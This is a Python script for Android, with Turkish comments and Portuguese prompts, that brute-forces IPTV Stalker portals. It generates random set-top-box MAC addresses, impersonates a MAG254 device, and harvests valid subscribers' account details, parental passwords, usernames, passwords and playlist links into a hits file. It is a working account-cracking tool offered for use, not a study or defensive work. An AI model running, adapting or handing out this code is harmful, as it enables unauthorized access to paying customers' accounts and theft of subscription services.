import requests, datetime
import json,random,sys, time
import androidhelper as sl4a
import subprocess
import pathlib
subprocess.run(["clear", ""])
ad = sl4a.Android()
oto=0
tur=0
say=0
bul=0
hit=0
cpm=1
ses= requests.Session()

macSayisi=99999999991#deneme sayisı
feyzo=("""
\33[32m
 ▰▰▰▰ᴘʏᴛʜᴏɴ ᴍᴏʀ-OTO-ᴘʏ ᴄᴏɴғɪɢ▰▰▰▰ ''\33[0m\n
Bu çalışma FeyzullahK tarafından kodlanmıştır. 
Hiçbir kaynak kullanılmamış ve alıntı yapılmamıştır. 
 
 \33[33mDestek verenler:
     @BarisTM
     @ByTurK_Turkiye
     @garaveli(Bestsharingsteam) \33[0m
     \33[32m
 ▰▰▰▰▰▰▰ 𝙈𝙧.𝙁𝙚𝙮𝙯𝙤@ ▰▰▰▰▰▰▰  '' " '
\33[0m""") 
print(feyzo) 
#################
panel = input("""
𝗘𝘅𝗲𝗺𝗽𝗹𝗼 𝗻𝗼𝗺𝗲 𝗱𝗼 𝗽𝗮𝗶𝗻𝗲𝗹:𝗽𝗼𝗿𝘁𝗮 = 𝗷𝗼𝘀𝗶𝗲𝗹𝗷𝗲𝗳𝗳𝗲𝗿𝘀𝗼𝗻.𝗰𝗼𝗺:𝟴𝟬𝟴𝟬\n
	\33[1m𝗣𝗼𝗿 𝗳𝗮𝘃𝗼𝗿, 𝗲𝘀𝗰𝗿𝗲𝘃𝗮 𝗼 𝗻𝗼𝗺𝗲 𝗱𝗼 𝗽𝗮𝗶𝗻𝗲𝗹... \n\n
𝗣𝗮𝗶𝗻𝗲𝗹:𝗣𝗼𝗿𝘁𝗮 = \33[0m\33[31m\33[1m""")
#################
#print("\nTaranacak Panel:Port=\33[1m\33[31m" + panel +"\33[0m\n") 
#D4:CF:F9
#MacCombo="33:44:CF:4"
MacCombo="00:1A:79:"
subprocess.run(["clear", ""])
print(feyzo) 
Macs = input("\33[0m\n𝗨𝘀𝗮𝗿 𝘀𝗲𝗿𝗶𝗮𝗹 𝗠𝗔𝗖? \nResponder \33[1m\33[34m𝗦𝗶𝗺\33[0m ou \33[1m\33[32m𝗡𝗮̃𝗼\33[0m 𝗘𝘀𝗰𝗿𝗲𝘃𝗮! = ") 
if Macs=="sim" or Macs=="Sim" :
    Seri=input("Amostra=00:1A:79:\33[31m5\33[0m\nAmostra=00:1A:79:\33[31mFa\33[32m\n𝗘𝘀𝗰𝗿𝗲𝘃𝗮 𝘂𝗺 𝗼𝘂 𝗱𝗼𝗶𝘀 𝘃𝗮𝗹𝗼𝗿𝗲𝘀!!!\33[0m\n\33[1m00:1A:79:\33[31m")
    #Seri=Seri
    MacCombo=MacCombo+Seri[:2]
#################
subprocess.run(["clear", ""])
print(feyzo) 
#print(len(feyzo)) 
mm=MacCombo.replace(':',"")
if not len(feyzo)==299 or panel=="" :
    exit() 
if len(mm)==6:
	turet=6
	MacCombo=MacCombo+":"
if len(mm)==7:
	turet=5
if len(mm)==8:
	turet=4
	MacCombo=MacCombo+":"
Rhit='\33[33m' 
Ehit='\033[0m' 
panel=panel.replace("http://","")
panel=panel.replace("/c","")
panel=panel.replace("/","")
DosyaA="/sdcard/hits/" + panel.replace(":","_") +"@MorPanelOTOmacV4.3 by Josiel Jefferson.txt"
def yaz(hits):
    dosya=open(DosyaA,'a+') 
    dosya.write(hits)
    dosya.close()
subprocess.run(["clear", ""])  
print(feyzo) 
for mag in range(0,macSayisi):
	oto=""
	mac=""
	tur=0
	if turet==5:
		nokta=1
	else:
		nokta=2
	for i in range(turet):
		if tur ==nokta:
			oto=oto+":"
			tur=0
			nokta=2
		oto=oto+random.choice('ABCDFE1234567890')
		tur = tur +1
		mac=oto
		
		
	mac=MacCombo+mac
	mac=mac.replace("::",":")
	mac=mac.replace(" ","")
	#mac="00:1a:79:1a:aa:74" 
	headera={
"Host": panel,
"Connection": "keep-alive",
"Accept": "*/*",
"User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
"Referer": "http://"+panel+"/c/" ,
"Accept-Language": "en-US,*",
"Accept-Charset": "UTF-8,*;q=0.8",
"X-User-Agent": "Model: MAG254; Link: Ethernet,WiFi",
"Cookie": "mac="+mac+"; stb_lang=en; timezone=Europe%2FBerlin; adid=91b4a5f6dfb347d871ac2b624696917f","Accept-Encoding": "gzip, deflate",
}
	url1="http://"+panel+"/portal.php?type=stb&action=handshake&token=" 
	
	res = ses.get(url1, headers=headera, timeout=20, verify=False)
	
	veri=str(res.text)
	#print(veri)
	say=say+1
	cpm=(time.time()-cpm)
	cpm=(round(60/cpm))
	print ("\33[0m" +mac+" - \33[32m" +panel +'\033[96m\n' +"      >>>>>Total:" + str(say)+" " +Rhit+ "Hit:" + str(hit)+"\33[94m Cpm:" +str(cpm)+"\033[0m")
	cpm=time.time()
	if not veri in ("js"):
		token=veri.replace('{"js":{"token":"',"")
		token=token.replace('"}}',"")
		#print(token)
		
		headerb={
		"Host": panel,
		"Connection": "keep-alive",
		"Accept": "*/*",
		"User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
		"Referer": "http://"+panel+"/c/" ,
		"Accept-Language": "en-US,*",
		"Accept-Charset": "UTF-8,*;q=0.8",
		"X-User-Agent": "Model: MAG254; Link: Ethernet,WiFi",
		"Cookie": "mac="+mac+"; stb_lang=en; timezone=Europe%2FBerlin; adid=91b4a5f6dfb347d871ac2b624696917f",
		"Authorization": "Bearer "+token,
		}
		
		url2="http://"+panel+"/portal.php?type=stb&action=get_profile"
		res = ses.get(url2, headers=headerb, timeout=15, verify=False)
		veri=str(res.text)
		#print(veri)
		chk="" 
		chk=veri.split('{"id":')[1]
		chk=chk.split(',"name')[0]
		chk=chk.replace('"',"")
		if not chk =="null":
			#print(chk+'\n')
			adult=veri.split('parent_password":"')[1]
			adult=adult.split('"')[0]
			#print(adult)
			hit=hit+1
			file = pathlib.Path("/sdcard/.hits.mp3")
			if file.exists ():
				ad.mediaPlay("/sdcard/.hits.mp3")
				#print(trh)
			headerc={
			"Host": panel,
			"Connection": "keep-alive",
			"Accept": "*/*",
			"User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
			"Referer": "http://"+panel+"/c/" ,
			"Accept-Language": "en-US,*",
			"Accept-Charset": "UTF-8,*;q=0.8",
			"X-User-Agent": "Model: MAG254; Link: Ethernet,WiFi",
			"Cookie": "mac="+mac+"; stb_lang=en; timezone=Europe%2FBerlin; adid=91b4a5f6dfb347d871ac2b624696917f",
			"Accept-Encoding": "gzip, deflate",
			"Authorization": "Bearer "+token,
			}
			
			url3="http://"+panel+"/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml&mac="+mac
			
			res = ses.get(url3, headers=headerc, timeout=15, verify=False)
			veri=str(res.text)
			passw=""
			if not veri in ("phone"):
				trh=veri.split('phone":"')[1]
				trh=trh.replace('"}}',"")
				#print(trh)
				
#				url4="http://"+panel+"/portal.php?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/1823_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
#				res = ses.get(url4, headers=headerc, timeout=15, verify=False)
#				veri=str(res.text)
#				print(veri)
				veri=""
				url5="http://"+panel+"/portal.php?action=get_ordered_list&type=vod&p=1&JsHttpRequest=1-xml" 
				res = ses.get(url5, headers=headerc, timeout=15, verify=False)
				veri=str(res.text)
				try:
					token2=veri.split('cmd":"')[1]
					token2=token2.split('"')[0]
				except:pass
				url6="http://"+panel+"/portal.php?action=create_link&type=vod&cmd="+token2+"&JsHttpRequest=1-xml"
				
				res = ses.get(url6, headers=headerc, timeout=15, verify=False)
				
				veri=str(res.text)
				try:
					real=veri.split('\/')[2]
					userm=veri.split('\/')[4]
					pasdm=veri.split('\/')[5]
					#print(real+'\n'+userm+'\n'+pasdm)
					
					headerm={
					"Host": panel,
					"Connection": "keep-alive",
					"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
					"Pragma": "no-cache",
					"Accept": "*/*",
					"Accept-Encoding": "gzip, deflate",
					}
					
					urlm="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&type=m3u"
					
					mlink="http://"+ panel + "/get.php?username=" + userm + "&password=" + pasdm + "&type=m3u_plus"
					
					res = ses.get(urlm, headers=headerm, timeout=15, verify=False)
					veri=str(res.text)
				except:pass
				vvv=veri[:1]
				if veri =="":
					vvv="<"
				#print(veri)
				#print(vvv)™
				if not vvv =="<":
					portal=veri.split('url":')[1]
					portal=portal.split(',')[0]
					realm="𝗥𝗲𝗮𝗹 ➤ http://"+portal.replace('"',"")
					portal="𝗣𝗼𝗿𝘁𝗮𝗹 ➤ http://"+panel+"/c/"
					port=veri.split('port":')[1]
					port=port.split(',')[0]
					port=""+port.replace('"',"")
					
					user=veri.split('username":')[1]
					user=user.split(',')[0]
					user="𝗟𝗼𝗴𝗶𝗻 ➤ "+user.replace('"',"")
					
					passw=veri.split('password":')[1]
					passw=passw.split(',')[0]
					passw=""+passw.replace('"',"")
					
					bitis=veri.split('exp_date":')[1]
					bitis=bitis.split(',')[0]
					bitis=bitis.replace('"',"")
					if bitis=="null":
						bitis="Ilimitado"
					else:
						bitis=(datetime.datetime.fromtimestamp(int(bitis)).strftime('%d-%m-%Y %H:%M:%S'))
					bitis=""+bitis
					
					acon=veri.split('active_cons":')[1]
					acon=acon.split(',')[0]
					acon="𝗖𝗼𝗻𝗲𝘅𝗮̃𝗼 𝗮𝘁𝗶𝘃𝗮 ➤ "+acon.replace('"',"")
					mcon=veri.split('max_connections":')[1]
					mcon=mcon.split(',')[0]
					mcon="𝗠𝗮́𝘅𝗶𝗺𝗼 𝗱𝗲 𝗰𝗼𝗻𝗲𝘅𝗮̃𝗼 ➤ "+mcon.replace('"',"")
			mc="╭───────────────•✧[ 𝗣𝘆𝘁𝗵𝗼𝗻 𝗠𝗢𝗥-𝗣𝗬 𝗖𝗼𝗻𝗳𝗶𝗴 ]✧•───────────────╮"+'\n'+"├✧𝗥𝗲𝗮𝗹 ➤ http://"+real+'\n'+"├✧𝗣𝗮𝗶𝗻𝗲𝗹 ➤ http://"+panel+"/c/"+'\n'+"├✧𝗠𝗮𝗰 ➤ "+mac+'\n'+"├✧𝗩𝗲𝗿𝗶𝗳𝗶𝗰𝗮𝗱𝗼 ➤ "+str(time.strftime("%d-%m-%Y %H:%M:%S"))+'\n'+"├✧𝗘𝘅𝗽𝗶𝗿𝗮 ➤ "+trh+'\n'+"├✧𝗖𝗼𝗻𝘁𝗿𝗼𝗹𝗲 𝗽𝗮𝗿𝗲𝗻𝘁𝗮𝗹 ➤ " +adult+'\n'
			
			imza=mc
			if not passw=="":
				imza=imza+"├✧─────────────•✧[ @𝗙𝗲𝘆𝘇𝘂𝗹𝗹𝗮𝗵𝗞<=>@𝗠𝗿.𝗙𝗲𝘆𝘇𝗼 ]✧•────────────"+'\n'+"├✧𝗨𝗥𝗟 ➤ http://"+panel+'\n'+"├✧"+user+" | "+passw+'\n'+"├✧"+acon+'\n'+"├✧"+mcon+'\n'
			imza=imza+"├✧𝗠𝟯𝗨 𝗨𝗥𝗟 ➤ "+mlink+'\n'
			
			imza=imza+"╰───────•✧[ 𝗣𝘆𝘁𝗵𝗼𝗻 𝗠𝗼𝗯𝗶𝗹𝗱𝗲𝗻 𝗧𝗮𝗺𝗮𝗿𝗮 𝗯𝘆 𝗝𝗼𝘀𝗶𝗲𝗹 𝗝𝗲𝗳𝗳𝗲𝗿𝘀𝗼𝗻 ]✧•───────╯"+'\n'
			
			print(imza)
			yaz(imza+'\n'+'\n')
			

#		
#	
